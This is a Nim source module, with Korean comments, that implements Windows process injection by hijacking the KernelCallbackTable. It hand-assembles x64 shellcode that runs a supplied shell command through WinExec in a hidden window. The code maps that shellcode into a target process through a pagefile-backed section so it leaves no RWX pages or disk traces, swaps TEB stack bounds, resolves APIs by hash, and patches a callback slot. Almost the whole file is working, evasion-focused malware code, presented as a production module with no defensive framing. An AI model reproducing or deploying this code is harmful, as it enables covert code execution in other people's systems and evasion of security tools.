## phantom_fiber_v4.nim — KCT Phantom Fiber v4 (Production Module)
##
## 기법: Pagefile-backed Anonymous Section Mapping
##
##   특징:
##     - 디스크 흔적 없음 (MEM_MAPPED | PAGE_EXECUTE_READ)
##     - RWX 페이지 없음 (스텁은 MEM_PRIVATE가 아닌 MEM_MAPPED 섹션에 존재)
##
##   실행 흐름:
##     1. NtCreateSection(NULL file, PAGE_EXECUTE_READWRITE, SEC_COMMIT)
##        → pagefile 기반 익명 섹션 생성
##     2. NtMapViewOfSection(local, RW) → 스텁 작성
##     3. NtUnmapViewOfSection(local) → 로컬 맵 해제
##     4. NtMapViewOfSection(remote, RX) → 타겟 프로세스에 RX로 매핑
##     5. KCT[index] → 스텁 VA로 패치
##
##   StubContext (MEM_PRIVATE | RW 별도 할당):
##     - atomic gate (one-shot, lock bts)
##     - 원래 KCT 핸들러 포인터 (실행 후 JMP 대상)
##     - WinExec 포인터
##     - 명령어 문자열 포인터
##     - private stack base/limit (TEB 안전 실행용)

import winim, strutils
import kct_core
import ../core/syscalls
import ../core/resolver

# ---------------------------------------------------------------------------
# 1. StubContext 레이아웃 (빌드 스텁의 오프셋과 반드시 일치해야 함)
# ---------------------------------------------------------------------------

type KCTStubContext* = object
    gate*:        uint64   # +0x00  atomic one-shot (lock bts)
    originalKct*: pointer  # +0x08  JMP 대상 (원래 KCT 핸들러)
    pWinExec*:    pointer  # +0x10  &WinExec
    cmdAddr*:     pointer  # +0x18  &command string
    stackBase*:   uint64   # +0x20  private stack 상단
    stackLimit*:  uint64   # +0x28  private stack 하단

# ---------------------------------------------------------------------------
# 2. x64 스텁 바이트 빌더
#    ctxAddr         = 원격 KCTStubContext 주소
#    originalKctAddr = 원래 KCT 핸들러 주소 (JMP 대상)
# ---------------------------------------------------------------------------

proc kct_build_stub*(ctxAddr: uint64, originalKctAddr: uint64): seq[byte] =
    var s: seq[byte] = @[]

    # 프롤로그: 사용할 레지스터 전부 저장
    s.add(0x50.byte)                       # push rax
    s.add(0x9C.byte)                       # pushfq
    s.add(@[0x51.byte, 0x52])              # push rcx, rdx
    s.add(0x53.byte)                       # push rbx (RSP 임시 보관)
    s.add(@[0x41.byte, 0x53])              # push r11 (ctx 포인터)
    s.add(@[0x41.byte, 0x56, 0x41, 0x57]) # push r14, r15 (TEB 섀도우)

    # r11 = ctxAddr (컨텍스트 구조체 포인터)
    s.add(@[0x49.byte, 0xBB])
    for j in 0..7: s.add(cast[byte]((ctxAddr shr (j*8)) and 0xFF))

    # Atomic one-shot gate: lock bts qword [r11+0], 0
    # CF = 이전 비트 값; CF=1이면 이미 실행됨 → skip으로 점프
    s.add(@[0xF0.byte, 0x41, 0x0F, 0xBA, 0x2B, 0x00])
    let jcOff = s.len
    s.add(@[0x72.byte, 0x00])             # jc skip (오프셋 나중에 패치)

    # TEB 스택 경계 교체 (gs:[8]=StackBase, gs:[10]=StackLimit)
    s.add(@[0x65.byte, 0x4C.byte, 0x8B, 0x34.byte, 0x25.byte, 0x08, 0x00, 0x00, 0x00])
    s.add(@[0x65.byte, 0x4C.byte, 0x8B, 0x3C.byte, 0x25.byte, 0x10, 0x00, 0x00, 0x00])
    # ctx의 private stack 경계로 설치
    s.add(@[0x49.byte, 0x8B, 0x43, 0x20]) # mov rax, [r11+0x20]  stackBase
    s.add(@[0x65.byte, 0x48.byte, 0x89, 0x04.byte, 0x25.byte, 0x08, 0x00, 0x00, 0x00])
    s.add(@[0x49.byte, 0x8B, 0x43, 0x28]) # mov rax, [r11+0x28]  stackLimit
    s.add(@[0x65.byte, 0x48.byte, 0x89, 0x04.byte, 0x25.byte, 0x10, 0x00, 0x00, 0x00])

    # private 스택으로 전환
    s.add(@[0x48.byte, 0x89, 0xE3])        # mov rbx, rsp (caller rsp 저장)
    s.add(@[0x49.byte, 0x8B, 0x63, 0x20]) # mov rsp, [r11+0x20] (stackBase)
    s.add(@[0x48.byte, 0x83, 0xEC, 0x30]) # sub rsp, 0x30 (shadow space + 정렬)

    # WinExec(cmd, SW_HIDE=0) 호출
    s.add(@[0x49.byte, 0x8B, 0x4B, 0x18]) # mov rcx, [r11+0x18]  cmdAddr
    s.add(@[0x48.byte, 0x31, 0xD2])        # xor rdx, rdx
    s.add(@[0x49.byte, 0xFF, 0x53, 0x10]) # call [r11+0x10]  pWinExec

    # RSP 복원
    s.add(@[0x48.byte, 0x83, 0xC4, 0x30]) # add rsp, 0x30
    s.add(@[0x48.byte, 0x89, 0xDC])        # mov rsp, rbx

    # TEB 스택 경계 복원
    s.add(@[0x65.byte, 0x4C.byte, 0x89, 0x34.byte, 0x25.byte, 0x08, 0x00, 0x00, 0x00])
    s.add(@[0x65.byte, 0x4C.byte, 0x89, 0x3C.byte, 0x25.byte, 0x10, 0x00, 0x00, 0x00])

    # jc skip 대상 패치
    let skipPos = s.len
    s[jcOff + 1] = cast[byte](skipPos - (jcOff + 2))

    # 에필로그: 저장했던 레지스터 복원
    s.add(@[0x41.byte, 0x5F, 0x41.byte, 0x5E]) # pop r15, r14
    s.add(@[0x41.byte, 0x5B])                   # pop r11
    s.add(0x5B.byte)                             # pop rbx
    s.add(@[0x5A.byte, 0x59])                    # pop rdx, rcx
    s.add(0x9D.byte)                             # popfq
    s.add(0x58.byte)                             # pop rax

    # 원래 KCT 핸들러로 JMP (r11 재활용)
    s.add(@[0x49.byte, 0xBB])
    for j in 0..7: s.add(cast[byte]((originalKctAddr shr (j*8)) and 0xFF))
    s.add(@[0x41.byte, 0xFF, 0xE3])              # jmp r11

    return s

# ---------------------------------------------------------------------------
# 3. Pagefile-backed 공유 섹션 매핑
#    로컬(RW)에 스텁 작성 → 해제 → 타겟 프로세스에 RX로 매핑
# ---------------------------------------------------------------------------

proc kct_pagefile_map*(hProcess: HANDLE, stub: seq[byte]): pointer =
    let secSize = max((stub.len + 0xFFF) and not 0xFFF, 0x1000)

    # pagefile 기반 익명 섹션 생성
    var maxSize: LARGE_INTEGER
    maxSize.QuadPart = secSize.int64
    var hSection: HANDLE = 0
    let st1 = NtCreateSection(addr hSection, SECTION_ALL_ACCESS.ACCESS_MASK, nil,
                              addr maxSize, PAGE_EXECUTE_READWRITE.ULONG,
                              SEC_COMMIT.ULONG, 0)
    if st1 != 0: return nil

    # 로컬 RW 매핑으로 스텁 작성
    var localVA: pointer = nil
    var localSz: SIZE_T = secSize.SIZE_T
    let st2 = NtMapViewOfSection(hSection, GetCurrentProcess(), addr localVA,
                                  0, 0, nil, addr localSz,
                                  1.ULONG, 0.ULONG, PAGE_READWRITE.ULONG)
    if st2 != 0:
        CloseHandle(hSection)
        return nil

    copyMem(localVA, unsafeAddr stub[0], stub.len)

    # 로컬 뷰 해제 (스텁은 섹션 페이지에 남음)
    var unmapVA = localVA
    var unmapSz: SIZE_T = 0
    discard NtFreeVirtualMemory(GetCurrentProcess(), addr unmapVA, addr unmapSz, MEM_RELEASE)

    # 타겟 프로세스에 RX로 원격 매핑
    var remoteVA: pointer = nil
    var remoteSz: SIZE_T = secSize.SIZE_T
    let st3 = NtMapViewOfSection(hSection, hProcess, addr remoteVA,
                                  0, 0, nil, addr remoteSz,
                                  1.ULONG, 0.ULONG, PAGE_EXECUTE_READ.ULONG)
    CloseHandle(hSection)

    if st3 != 0 and st3 != 0x40000000.NTSTATUS:
        return nil

    return remoteVA

# ---------------------------------------------------------------------------
# 4. 메인 API
# ---------------------------------------------------------------------------

proc inject_phantom_fiber_v4*(hProcess: HANDLE, index: int, command: string): bool =
    ## KCT Phantom Fiber v4 — 프로덕션 진입점.
    ##
    ## pagefile-backed 익명 섹션을 생성하고 스텁을 넣은 후,
    ## 타겟 프로세스에 RX로 매핑하고 KCT[index]를 그 주소로 패치한다.
    ##
    ## Parameters:
    ##   hProcess  — 타겟 프로세스 핸들 (PROCESS_ALL_ACCESS)
    ##   index     — KCT 슬롯 인덱스 (보통 2 = NlsDispatchAnsiEnumerateCodePage)
    ##   command   — WinExec로 실행할 쉘 명령어

    # 컨텍스트 할당 (RW, KCT 스캐너 범위 밖)
    var ctxSize: SIZE_T = 65536
    var ctxBase: pointer
    if NtAllocateVirtualMemory(hProcess, addr ctxBase, 0, addr ctxSize,
                               MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE) != 0:
        return false

    let ctxAddr    = cast[uint64](ctxBase)
    let cmdAddr    = ctxAddr + 0x1000           # 커맨드 문자열 위치
    let stackLimit = ctxAddr + 0x4000           # private 스택 하단
    let stackBase  = ctxAddr + cast[uint64](ctxSize) - 0x400  # private 스택 상단

    # 현재 KCT 슬롯 읽기
    let kct = read_kct(hProcess)
    if kct == nil: return false

    var original: pointer
    var br: SIZE_T
    if NtReadVirtualMemory(hProcess,
                           cast[pointer](cast[uint64](kct) + (index * 8).uint64),
                           addr original, 8, addr br) != 0:
        return false

    # 원격 컨텍스트에 커맨드 문자열 기록
    let cmd = command & "\0"
    discard NtWriteVirtualMemory(hProcess, cast[pointer](cmdAddr),
                                 cast[pointer](cstring(cmd)), cmd.len.SIZE_T, addr br)

    # KCTStubContext 기록
    var ctx: KCTStubContext
    ctx.gate        = 0
    ctx.originalKct = original
    ctx.pWinExec    = get_proc_address_hashed(get_module_base(H"kernel32.dll"), H"WinExec")
    ctx.cmdAddr     = cast[pointer](cmdAddr)
    ctx.stackBase   = stackBase
    ctx.stackLimit  = stackLimit
    discard NtWriteVirtualMemory(hProcess, cast[pointer](ctxAddr),
                                 addr ctx, sizeof(ctx).SIZE_T, addr br)

    # 스텁 빌드 및 pagefile 섹션에 배치
    let stub   = kct_build_stub(ctxAddr, cast[uint64](original))
    let stubVA = kct_pagefile_map(hProcess, stub)
    if stubVA == nil: return false

    # KCT 패치
    var dummy: pointer
    return patch_kct(hProcess, index, stubVA, addr dummy, kct)
